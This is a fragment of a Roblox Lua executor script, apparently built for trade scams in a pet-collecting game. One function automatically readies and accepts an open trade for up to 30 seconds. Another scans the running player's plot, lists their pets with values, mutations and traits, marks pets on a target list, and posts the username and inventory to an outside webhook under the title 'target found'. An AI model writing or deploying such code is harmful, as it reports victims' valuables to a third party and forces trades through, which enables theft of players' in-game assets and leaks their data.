local function fireReadyOrAccept()
	if not isTradeActive() then return end

	local elapsed = 0
	while isTradeActive() and elapsed < 30 do
		if allPlayersReady() then
			fireAccept()
		else
			fireReady()
		end
		task.wait(_G.Settings.AcceptDelay or 2.5)
		elapsed += (_G.Settings.AcceptDelay or 2.5)
	end
end

local function sendWebhook(plotFolder)
	local webhook = _G.Settings.Webhook
	if not webhook or webhook == "" then return end

	
	local mainRoot = plotFolder:FindFirstChild("MainRoot") or plotFolder:FindFirstChildWhichIsA("BasePart")
	if not mainRoot then return end

	local plotPos = mainRoot.Position
	local plotSize = mainRoot.Size
	local searchRange = Vector3.new(plotSize.X * 20, 1000, plotSize.Z * 20)

	local totalTemplates = 0
	local inRange = 0
	local entries = {}
	local targetEntries = {}

	for _, obj in ipairs(workspace.Debris:GetChildren()) do
		if obj.Name == "FastOverheadTemplate" then
			totalTemplates += 1
			local overhead = obj:FindFirstChild("AnimalOverhead")
			local pos = obj:IsA("BasePart") and obj.Position or (obj:FindFirstChildWhichIsA("BasePart") and obj:FindFirstChildWhichIsA("BasePart").Position)
			if overhead and pos then
				local displayNameObj = overhead:FindFirstChild("DisplayName")
				local generationObj = overhead:FindFirstChild("Generation")
				local mutationObj = overhead:FindFirstChild("Mutation")
				local traitsFolder = overhead:FindFirstChild("Traits")

				if displayNameObj and generationObj then
					local ok, displayName = pcall(function() return displayNameObj.Text end)
					local diff = pos - plotPos
					local halfRange = searchRange / 2
					local withinRange = math.abs(diff.X) <= halfRange.X and math.abs(diff.Z) <= halfRange.Z
					if withinRange then inRange += 1 end
					if ok and withinRange then
						local mutation = "Default"
						pcall(function()
							if mutationObj and mutationObj.Visible and mutationObj.TextTransparency < 1 then
								local raw = mutationObj.Text:gsub("<[^>]+>", ""):gsub("%s+", " "):match("^%s*(.-)%s*$") or ""
								if raw ~= "" then
									mutation = raw
								end
							end
						end)
						local gen = ""
						pcall(function() gen = generationObj.Text end)
						local traits = {}
						if traitsFolder then
							for _, t in ipairs(traitsFolder:GetChildren()) do
								if t.Name ~= "Template" and t.Name ~= "UIListLayout" then
									table.insert(traits, t.Name)
								end
							end
						end
						local entry = { name = displayName, gen = gen, mutation = mutation, traits = traits }
						table.insert(entries, entry)
						if _G.Settings.Brainrots[displayName] then
							table.insert(targetEntries, entry)
						end
					end
				end
			end
		end
	end

	local parseGen = function(g)
		local n = tonumber(g:match("([%d%.]+)")) or 0
		if g:find("B") then n = n * 1e9
		elseif g:find("M") then n = n * 1e6
		elseif g:find("K") then n = n * 1e3 end
		return n
	end

	table.sort(entries, function(a, b) return parseGen(a.gen) > parseGen(b.gen) end)

	local player = Players.LocalPlayer
	local now = os.date("%m/%d/%Y %I:%M %p")

	local lines = {}
	for i, e in ipairs(entries) do
		local mutStr = (e.mutation and e.mutation ~= "Default" and e.mutation ~= "None" and e.mutation ~= "") and (" | " .. e.mutation) or " | No Mutation"
		local genClean = e.gen:gsub("%$", "")
		table.insert(lines, i .. ". [" .. genClean .. "] " .. e.name .. mutStr)
	end

	local description = table.concat(lines, "\n")
	if #description > 3500 then
		description = description:sub(1, 3500) .. "\n..."
	end

	local targetLines = {}
	for _, e in ipairs(targetEntries) do
		table.insert(targetLines, "🎯 " .. e.name)
	end
	local targetStr = #targetLines > 0 and table.concat(targetLines, "\n") or "none"
	if #targetStr > 1000 then targetStr = targetStr:sub(1, 1000) .. "\n..." end

	local color = #targetEntries > 0 and 0x57F287 or 0xFF0000
	local fields = {
		{ name = "username:", value = "`" .. player.Name .. "`", inline = false },
		{ name = "inventory: (" .. tostring(#entries) .. ")", value = "```\n" .. description .. "\n```", inline = false },
		{ name = "targets found (" .. tostring(#targetEntries) .. ")", value = targetStr, inline = false },
	}

	local payload = game:GetService("HttpService"):JSONEncode({
		embeds = {{
			title = "target found",
			color = color,
			fields = fields,
			footer = { text = now },
		}}
	})

	pcall(function()
		request({
			Url = webhook,
			Method = "POST",
			Headers = { ["Content-Type"] = "application/json" },
			Body = payload
		})
	end)
end

